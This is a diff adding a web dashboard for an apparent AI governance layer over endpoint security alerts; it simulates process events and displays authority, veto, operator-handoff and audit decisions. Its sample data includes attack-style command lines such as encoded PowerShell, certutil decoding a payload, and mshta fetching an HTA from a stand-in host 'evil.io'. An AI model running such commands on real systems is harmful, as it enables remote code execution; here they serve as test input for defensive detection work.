@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>M.E.M.I. × ETOS-AD — Live Governance Dashboard</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;800&display=swap');
+
+  :root {
+    --bg:          #0a0c0f;
+    --bg2:         #0f1318;
+    --bg3:         #141920;
+    --border:      #1e2730;
+    --border2:     #263040;
+
+    --text:        #c8d4e0;
+    --text-dim:    #4a5a6a;
+    --text-mid:    #7a8fa0;
+
+    --blue:        #3b82f6;
+    --blue-dim:    #1e3a5f;
+    --green:       #22c55e;
+    --green-dim:   #0f2e1a;
+    --yellow:      #eab308;
+    --yellow-dim:  #2a2200;
+    --red:         #ef4444;
+    --red-dim:     #2e0f0f;
+    --orange:      #f97316;
+    --orange-dim:  #2e1500;
+
+    --auth-high:   #22c55e;
+    --auth-med:    #3b82f6;
+    --auth-low:    #eab308;
+    --auth-none:   #ef4444;
+
+    --font-mono:   'JetBrains Mono', monospace;
+    --font-display:'Syne', sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-mono);
+    font-size: 12px;
+    line-height: 1.5;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ── Header ── */
+  .header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 20px 12px;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg2);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+  .header-left { display: flex; align-items: baseline; gap: 12px; }
+  .header-title {
+    font-family: var(--font-display);
+    font-size: 15px;
+    font-weight: 800;
+    color: #fff;
+    letter-spacing: 0.02em;
+  }
+  .header-sub {
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+  }
+  .header-right { display: flex; align-items: center; gap: 16px; }
+  .pulse {
+    width: 7px; height: 7px; border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 8px var(--green);
+    animation: pulse 2s ease-in-out infinite;
+  }
+  .pulse.offline { background: var(--red); box-shadow: 0 0 8px var(--red); animation: none; }
+  @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
+
+  .status-text { font-size: 10px; color: var(--text-dim); letter-spacing: 0.06em; }
+
+  .btn {
+    font-family: var(--font-mono);
+    font-size: 10px;
+    padding: 5px 12px;
+    border: 1px solid var(--border2);
+    background: var(--bg3);
+    color: var(--text-mid);
+    cursor: pointer;
+    letter-spacing: 0.05em;
+    transition: all 0.15s;
+  }
+  .btn:hover { border-color: var(--blue); color: var(--blue); }
+  .btn.active { border-color: var(--green); color: var(--green); background: var(--green-dim); }
+  .btn.danger { border-color: var(--red); color: var(--red); }
+
+  /* ── Layout ── */
+  .layout {
+    display: grid;
+    grid-template-columns: 1fr 340px 300px;
+    grid-template-rows: auto 1fr;
+    height: calc(100vh - 49px);
+    gap: 0;
+  }
+
+  /* ── Stats bar ── */
+  .stats-bar {
+    grid-column: 1 / -1;
+    display: flex;
+    gap: 0;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg2);
+  }
+  .stat {
+    flex: 1;
+    padding: 10px 16px;
+    border-right: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+  }
+  .stat:last-child { border-right: none; }
+  .stat-label { font-size: 9px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.1em; }
+  .stat-value { font-size: 20px; font-weight: 700; font-family: var(--font-display); color: #fff; }
+  .stat-value.green { color: var(--auth-high); }
+  .stat-value.blue  { color: var(--auth-med); }
+  .stat-value.yellow{ color: var(--auth-low); }
+  .stat-value.red   { color: var(--auth-none); }
+
+  /* ── Event feed ── */
+  .feed {
+    border-right: 1px solid var(--border);
+    overflow-y: auto;
+    background: var(--bg);
+  }
+  .feed-header {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    font-size: 9px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    position: sticky;
+    top: 0;
+    background: var(--bg2);
+    z-index: 10;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .event-row {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    cursor: pointer;
+    transition: background 0.1s;
+    animation: slideIn 0.25s ease-out;
+  }
+  @keyframes slideIn {
+    from { opacity: 0; transform: translateX(-8px); }
+    to   { opacity: 1; transform: translateX(0); }
+  }
+  .event-row:hover { background: var(--bg3); }
+  .event-row.selected { background: var(--bg3); border-left: 2px solid var(--blue); }
+
+  .event-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
+  .event-proc { font-size: 11px; font-weight: 500; color: #fff; }
+  .event-time { font-size: 9px; color: var(--text-dim); }
+
+  .event-badges { display: flex; gap: 5px; flex-wrap: wrap; }
+  .badge {
+    font-size: 9px;
+    padding: 2px 6px;
+    border: 1px solid;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    font-weight: 700;
+  }
+  .badge-high   { color: var(--auth-high);   border-color: var(--auth-high);   background: var(--green-dim); }
+  .badge-medium { color: var(--auth-med);    border-color: var(--auth-med);    background: var(--blue-dim); }
+  .badge-low    { color: var(--auth-low);    border-color: var(--auth-low);    background: var(--yellow-dim); }
+  .badge-none   { color: var(--auth-none);   border-color: var(--auth-none);   background: var(--red-dim); }
+  .badge-veto   { color: var(--orange);      border-color: var(--orange);      background: var(--orange-dim); }
+  .badge-action { color: var(--text-mid);    border-color: var(--border2);     background: transparent; }
+  .badge-fast   { color: var(--green);       border-color: var(--green);       background: var(--green-dim); }
+
+  .event-action {
+    margin-top: 4px;
+    font-size: 10px;
+    color: var(--text-mid);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .event-action.deferred { color: var(--red); }
+  .event-action.held     { color: var(--yellow); }
+  .event-action.allowed  { color: var(--green); }
+
+  /* ── Authority panel (middle) ── */
+  .authority-panel {
+    border-right: 1px solid var(--border);
+    overflow-y: auto;
+    background: var(--bg);
+  }
+  .panel-header {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    font-size: 9px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    background: var(--bg2);
+    position: sticky;
+    top: 0;
+    z-index: 10;
+  }
+
+  .auth-display {
+    padding: 20px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+  .auth-level {
+    font-family: var(--font-display);
+    font-size: 42px;
+    font-weight: 800;
+    line-height: 1;
+    margin-bottom: 4px;
+    transition: color 0.3s;
+  }
+  .auth-level.high   { color: var(--auth-high); }
+  .auth-level.medium { color: var(--auth-med); }
+  .auth-level.low    { color: var(--auth-low); }
+  .auth-level.none   { color: var(--auth-none); }
+  .auth-sub { font-size: 10px; color: var(--text-dim); letter-spacing: 0.06em; text-transform: uppercase; }
+
+  .detail-block {
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--border);
+  }
+  .detail-label {
+    font-size: 9px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-bottom: 6px;
+  }
+  .detail-value {
+    font-size: 12px;
+    color: var(--text);
+  }
+  .detail-value.veto-active {
+    color: var(--orange);
+    font-weight: 700;
+  }
+  .detail-value.action-deferred { color: var(--red); font-weight: 700; }
+  .detail-value.action-held     { color: var(--yellow); font-weight: 700; }
+  .detail-value.action-allowed  { color: var(--green); }
+
+  .final-action-box {
+    margin: 12px 16px;
+    padding: 12px;
+    border: 1px solid var(--border2);
+    background: var(--bg2);
+  }
+  .final-action-label {
+    font-size: 9px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    margin-bottom: 6px;
+  }
+  .final-action-text {
+    font-size: 11px;
+    color: var(--text);
+    line-height: 1.6;
+  }
+  .final-action-text.deferred { color: var(--red); }
+  .final-action-text.held     { color: var(--yellow); }
+  .final-action-text.allowed  { color: var(--green); }
+
+  .tensions-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1px;
+    background: var(--border);
+    margin: 0 16px 12px;
+    border: 1px solid var(--border);
+  }
+  .tension-cell {
+    background: var(--bg2);
+    padding: 8px 10px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .tension-name { font-size: 9px; color: var(--text-dim); text-transform: uppercase; }
+  .tension-bar-wrap { width: 40px; height: 4px; background: var(--border2); margin: 0 6px; }
+  .tension-bar { height: 4px; background: var(--blue); transition: width 0.4s; }
+  .tension-val { font-size: 10px; color: var(--text); font-weight: 700; min-width: 12px; text-align: right; }
+
+  .gaps-list { padding: 0 16px 12px; }
+  .gap-item {
+    padding: 5px 8px;
+    margin-bottom: 4px;
+    background: var(--bg3);
+    border-left: 2px solid var(--red);
+    font-size: 10px;
+    color: var(--text-mid);
+  }
+
+  /* ── Audit trail (right) ── */
+  .audit-panel {
+    overflow-y: auto;
+    background: var(--bg);
+  }
+  .audit-entry {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    animation: fadeIn 0.3s ease-out;
+  }
+  @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
+  .audit-ts { font-size: 9px; color: var(--text-dim); margin-bottom: 3px; }
+  .audit-proc { font-size: 10px; font-weight: 500; color: #fff; margin-bottom: 3px; }
+  .audit-line { font-size: 10px; color: var(--text-mid); margin-bottom: 1px; }
+  .audit-line span { color: var(--text); }
+  .audit-line.deferred span { color: var(--red); }
+  .audit-line.held span     { color: var(--yellow); }
+  .audit-line.allowed span  { color: var(--green); }
+
+  .handoff-block {
+    margin-top: 6px;
+    padding: 6px 8px;
+    background: var(--red-dim);
+    border-left: 2px solid var(--red);
+    font-size: 9px;
+    color: var(--red);
+    line-height: 1.6;
+  }
+
+  .empty-state {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 200px;
+    color: var(--text-dim);
+    gap: 8px;
+  }
+  .empty-state .big { font-family: var(--font-display); font-size: 32px; opacity: 0.2; }
+
+  /* scrollbar */
+  ::-webkit-scrollbar { width: 4px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-left">
+    <span class="header-title">M.E.M.I. × ETOS-AD</span>
+    <span class="header-sub">Live Governance Dashboard</span>
+  </div>
+  <div class="header-right">
+    <span class="status-text" id="llm-mode">connecting...</span>
+    <div class="pulse" id="pulse-dot"></div>
+    <button class="btn active" id="sim-btn" onclick="toggleSim()">⏸ PAUSE</button>
+    <button class="btn" onclick="clearAll()">CLEAR</button>
+  </div>
+</div>
+
+<div class="layout">
+
+  <!-- Stats bar -->
+  <div class="stats-bar">
+    <div class="stat">
+      <span class="stat-label">Total Events</span>
+      <span class="stat-value" id="s-total">0</span>
+    </div>
+    <div class="stat">
+      <span class="stat-label">Allowed</span>
+      <span class="stat-value green" id="s-allowed">0</span>
+    </div>
+    <div class="stat">
+      <span class="stat-label">Held</span>
+      <span class="stat-value yellow" id="s-held">0</span>
+    </div>
+    <div class="stat">
+      <span class="stat-label">Deferred</span>
+      <span class="stat-value red" id="s-deferred">0</span>
+    </div>
+    <div class="stat">
+      <span class="stat-label">Fast-Lane</span>
+      <span class="stat-value blue" id="s-fast">0</span>
+    </div>
+    <div class="stat">
+      <span class="stat-label">Vetos</span>
+      <span class="stat-value" id="s-veto" style="color:var(--orange)">0</span>
+    </div>
+    <div class="stat">
+      <span class="stat-label">Self-Model</span>
+      <span class="stat-value" id="s-selfmodel" style="font-size:11px;color:var(--green)">—</span>
+    </div>
+  </div>
+
+  <!-- Event feed -->
+  <div class="feed">
+    <div class="feed-header">
+      <span>Incoming Events</span>
+      <span id="feed-count">0 events</span>
+    </div>
+    <div id="feed-list"></div>
+  </div>
+
+  <!-- Authority panel -->
+  <div class="authority-panel">
+    <div class="panel-header">Authority / Veto / Action</div>
+    <div id="auth-content">
+      <div class="empty-state">
+        <span class="big">⊘</span>
+        <span>Select an event</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Audit trail -->
+  <div class="audit-panel">
+    <div class="panel-header">Audit Trail</div>
+    <div id="audit-list"></div>
+  </div>
+
+</div>
+
+<script>
+const API = 'http://127.0.0.1:8000'
+
+// ── State ────────────────────────────────────
+let events     = []
+let selected   = null
+let simRunning = true
+let simTimer   = null
+let stats      = { total:0, allowed:0, held:0, deferred:0, fast:0, veto:0 }
+
+// ── Security event scenarios (mirrors ETOS eventSimulator) ──
+const SCENARIOS = [
+  { process_name:'explorer.exe',   command_line:'normal',                anomaly_score:0.12, impact_category:'low',      hour_of_day:14, whitelist_match:true,  confidence:0.95, live_c2:false },
+  { process_name:'svchost.exe',    command_line:'-k netsvcs',            anomaly_score:0.14, impact_category:'low',      hour_of_day:11, whitelist_match:true,  confidence:0.90, live_c2:false },
+  { process_name:'msedge.exe',     command_line:'update',                anomaly_score:0.10, impact_category:'low',      hour_of_day:15, whitelist_match:true,  confidence:0.96, live_c2:false },
+  { process_name:'cmd.exe',        command_line:'/c whoami',             anomaly_score:0.45, impact_category:'medium',   hour_of_day:10, whitelist_match:false, confidence:0.70, live_c2:false },
+  { process_name:'powershell.exe', command_line:'-enc dGVzdA==',         anomaly_score:0.78, impact_category:'high',     hour_of_day:22, whitelist_match:false, confidence:0.55, live_c2:false },
+  { process_name:'powershell.exe', command_line:'-enc JAB0AGUAcwB0AA==', anomaly_score:0.88, impact_category:'high',     hour_of_day:3,  whitelist_match:false, confidence:0.50, live_c2:true  },
+  { process_name:'certutil.exe',   command_line:'-decode payload.b64',   anomaly_score:0.72, impact_category:'high',     hour_of_day:2,  whitelist_match:false, confidence:0.60, live_c2:false },
+  { process_name:'mshta.exe',      command_line:'http://evil.io/x.hta',  anomaly_score:0.85, impact_category:'critical', hour_of_day:4,  whitelist_match:false, confidence:0.45, live_c2:true  },
+  { process_name:'notepad.exe',    command_line:'report.txt',            anomaly_score:0.08, impact_category:'low',      hour_of_day:13, whitelist_match:true,  confidence:0.98, live_c2:false },
+  { process_name:'regsvr32.exe',   command_line:'/s /u scrobj.dll',      anomaly_score:0.80, impact_category:'high',     hour_of_day:1,  whitelist_match:false, confidence:0.52, live_c2:false },
+]
+
+let scenarioIdx = 0
+function nextScenario() {
+  const s = SCENARIOS[scenarioIdx % SCENARIOS.length]
+  scenarioIdx++
+  return { ...s, id: `evt-${Date.now()}-${Math.random().toString(36).slice(2,6)}`,
+           timestamp: new Date().toISOString() }
+}
+
+// ── API call ──────────────────────────────────
+async function evaluate(event) {
+  const r = await fetch(`${API}/api/decision`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ event }),
+  })
+  if (!r.ok) throw new Error(`HTTP ${r.status}`)
+  return r.json()
+}
+
+async function fetchHealth() {
+  try {
+    const r = await fetch(`${API}/health`)
+    if (!r.ok) return null
+    return r.json()
+  } catch { return null }
+}
+
+// ── Simulation loop ───────────────────────────
+function startSim() {
+  if (simTimer) clearInterval(simTimer)
+  simTimer = setInterval(async () => {
+    if (!simRunning) return
+    try {
+      const event  = nextScenario()
+      const result = await evaluate(event)
+      result.event = { ...event, ...result.event }
+      addEvent(result)
+    } catch(e) {
+      setPulse(false)
+    }
+  }, 1800 + Math.random() * 600)
+}
+
+function toggleSim() {
+  simRunning = !simRunning
+  const btn = document.getElementById('sim-btn')
+  btn.textContent = simRunning ? '⏸ PAUSE' : '▶ RESUME'
+  btn.className = simRunning ? 'btn active' : 'btn'
+}
+
+function clearAll() {
+  events = []; selected = null
+  stats = { total:0, allowed:0, held:0, deferred:0, fast:0, veto:0 }
+  document.getElementById('feed-list').innerHTML = ''
+  document.getElementById('audit-list').innerHTML = ''
+  renderAuth(null)
+  updateStats()
+}
+
+// ── Classify outcome ──────────────────────────
+function classifyOutcome(d) {
+  const action = (d.memi_action || '').toLowerCase()
+  const final  = (d.final_action || '').toLowerCase()
+  if (action === 'defer_to_operator' || final.includes('deferred') || final.includes('blocked'))
+    return 'deferred'
+  if (action === 'hold' || final.includes('held'))
+    return 'held'
+  return 'allowed'
+}
+
+function authClass(level) {
+  return (level || '').toLowerCase()
+}
+
+// ── Add event ─────────────────────────────────
+function addEvent(d) {
+  events.unshift(d)
+  if (events.length > 150) events.pop()
+
+  const outcome = classifyOutcome(d)
+  stats.total++
+  if (outcome === 'allowed')  stats.allowed++
+  if (outcome === 'held')     stats.held++
+  if (outcome === 'deferred') stats.deferred++
+  if (d.memi_fast_lane)       stats.fast++
+  if (d.memi_veto && d.memi_veto !== 'none') stats.veto++
+
+  updateStats()
+  renderFeedItem(d, outcome)
+  renderAuditEntry(d, outcome)
+  if (!selected) renderAuth(d)
+  document.getElementById('feed-count').textContent = `${events.length} events`
+  setPulse(true)
+}
+
+function updateStats() {
+  document.getElementById('s-total').textContent    = stats.total
+  document.getElementById('s-allowed').textContent  = stats.allowed
+  document.getElementById('s-held').textContent     = stats.held
+  document.getElementById('s-deferred').textContent = stats.deferred
+  document.getElementById('s-fast').textContent     = stats.fast
+  document.getElementById('s-veto').textContent     = stats.veto
+}
+
+// ── Feed item ─────────────────────────────────
+function renderFeedItem(d, outcome) {
+  const list = document.getElementById('feed-list')
+  const proc = d.event?.process_name || '?'
+  const auth = (d.memi_authority || '').toLowerCase()
+  const veto = d.memi_veto && d.memi_veto !== 'none' ? d.memi_veto : null
+  const fast = d.memi_fast_lane
+
+  const div = document.createElement('div')
+  div.className = 'event-row'
+  div.dataset.id = d.event?.id || Date.now()
+
+  const time = new Date().toLocaleTimeString('en-GB', { hour12:false })
+  const actionText = d.final_action || d.recommended_action || '—'
+  const actionClass = outcome
+
+  div.innerHTML = `
+    <div class="event-top">
+      <span class="event-proc">${proc}</span>
+      <span class="event-time">${time}</span>
+    </div>
+    <div class="event-badges">
+      <span class="badge badge-${auth}">${(d.memi_authority||'?').toUpperCase()}</span>
+      ${veto ? `<span class="badge badge-veto">${veto}</span>` : ''}
+      ${fast  ? `<span class="badge badge-fast">⚡ FAST</span>` : ''}
+      <span class="badge badge-action">${d.mode || '?'}</span>
+    </div>
+    <div class="event-action ${actionClass}">${actionText}</div>
+  `
+
+  div.addEventListener('click', () => {
+    document.querySelectorAll('.event-row').forEach(r => r.classList.remove('selected'))
+    div.classList.add('selected')
+    selected = d
+    renderAuth(d)
+  })
+
+  list.insertBefore(div, list.firstChild)
+}
+
+// ── Authority panel ───────────────────────────
+function renderAuth(d) {
+  const el = document.getElementById('auth-content')
+  if (!d) {
+    el.innerHTML = `<div class="empty-state"><span class="big">⊘</span><span>Select an event</span></div>`
+    return
+  }
+
+  const auth    = (d.memi_authority || 'NONE').toLowerCase()
+  const veto    = d.memi_veto && d.memi_veto !== 'none' ? d.memi_veto : null
+  const action  = d.memi_action || '?'
+  const outcome = classifyOutcome(d)
+  const tensions= d.tensions || {}
+  const gaps    = d.memi_gaps || 0
+  const fast    = d.memi_fast_lane
+
+  const tensionKeys = ['coercion','refusal','capacity','risk','time','advance_directive']
+
+  el.innerHTML = `
+    <div class="auth-display">
+      <div class="auth-level ${auth}">${(d.memi_authority||'NONE').toUpperCase()}</div>
+      <div class="auth-sub">epistemic authority</div>
+    </div>
+
+    <div class="detail-block">
+      <div class="detail-label">Veto</div>
+      <div class="detail-value ${veto ? 'veto-active' : ''}">${veto || 'none'}</div>
+    </div>
+
+    <div class="detail-block">
+      <div class="detail-label">M.E.M.I. Action</div>
+      <div class="detail-value action-${outcome}">${action.toUpperCase()}</div>
+    </div>
+
+    <div class="detail-block">
+      <div class="detail-label">Fast-Lane Cache</div>
+      <div class="detail-value ${fast ? 'action-allowed' : ''}">${fast ? '⚡ USED' : 'full evaluation'}</div>
+    </div>
+
+    <div class="detail-block">
+      <div class="detail-label">ETOS Mode</div>
+      <div class="detail-value">${d.mode || '—'}</div>
+    </div>
+
+    <div class="detail-block">
+      <div class="detail-label">Critical Gaps</div>
+      <div class="detail-value ${gaps > 0 ? 'action-held' : ''}">${gaps}</div>
+    </div>
+
+    <div class="final-action-box">
+      <div class="final-action-label">Final Action</div>
+      <div class="final-action-text ${outcome}">${d.final_action || d.recommended_action || '—'}</div>
+    </div>
+
+    <div class="detail-block">
+      <div class="detail-label">ETOS Tensions</div>
+    </div>
+    <div class="tensions-grid">
+      ${tensionKeys.map(k => `
+        <div class="tension-cell">
+          <span class="tension-name">${k.replace('_',' ')}</span>
+          <div class="tension-bar-wrap"><div class="tension-bar" style="width:${(tensions[k]||0)/5*100}%"></div></div>
+          <span class="tension-val">${tensions[k]||0}</span>
+        </div>
+      `).join('')}
+    </div>
+
+    ${d.memi_handoff ? `
+      <div class="detail-block">
+        <div class="detail-label">Handoff Package</div>
+        <div class="detail-value action-deferred" style="font-size:10px;line-height:1.7">
+          ${d.memi_handoff.required_action || ''}<br>
+          <span style="color:var(--text-dim)">${d.memi_handoff.resume_condition || ''}</span>
+        </div>
+      </div>
+    ` : ''}
+
+    <div class="detail-block">
+      <div class="detail-label">Self-Model</div>
+      <div class="detail-value">${d.memi_self_model || '—'}</div>
+    </div>
+
+    <div class="detail-block">
+      <div class="detail-label">Process</div>
+      <div class="detail-value">${d.event?.process_name || '—'}</div>
+    </div>
+
+    <div class="detail-block">
+      <div class="detail-label">Anomaly Score</div>
+      <div class="detail-value">${d.event?.anomaly_score ?? '—'}</div>
+    </div>
+  `
+}
+
+// ── Audit entry ───────────────────────────────
+function renderAuditEntry(d, outcome) {
+  const list = document.getElementById('audit-list')
+  const time = new Date().toLocaleTimeString('en-GB', { hour12:false })
+  const proc = d.event?.process_name || '?'
+
+  const div = document.createElement('div')
+  div.className = 'audit-entry'
+  div.innerHTML = `
+    <div class="audit-ts">${time}</div>
+    <div class="audit-proc">${proc}</div>
+    <div class="audit-line">auth  <span>${d.memi_authority || '?'}</span></div>
+    <div class="audit-line">veto  <span>${d.memi_veto && d.memi_veto !== 'none' ? d.memi_veto : 'none'}</span></div>
+    <div class="audit-line ${outcome}">→     <span>${d.final_action || d.recommended_action || '?'}</span></div>
+    ${d.memi_handoff ? `<div class="handoff-block">⛔ HANDOFF — operator required</div>` : ''}
+  `
+
+  list.insertBefore(div, list.firstChild)
+  if (list.children.length > 80) list.removeChild(list.lastChild)
+}
+
+// ── Pulse + health ────────────────────────────
+function setPulse(online) {
+  const dot = document.getElementById('pulse-dot')
+  dot.className = online ? 'pulse' : 'pulse offline'
+}
+
+async function checkHealth() {
+  const h = await fetchHealth()
+  const el = document.getElementById('llm-mode')
+  const sm = document.getElementById('s-selfmodel')
+  if (h) {
+    el.textContent = `v${h.memi_version} · governed`
+    setPulse(true)
+    if (h.self_model?.assessment) {
+      sm.textContent = h.self_model.assessment.replace('_', ' ')
+      sm.style.color = h.self_model.assessment === 'stable_boundary'
+        ? 'var(--green)' : 'var(--orange)'
+    }
+  } else {
+    el.textContent = 'backend offline'
+    setPulse(false)
+  }
+}
+
+// ── Init ──────────────────────────────────────
+checkHealth()
+setInterval(checkHealth, 10000)
+startSim()
+</script>
+</body>
+</html>
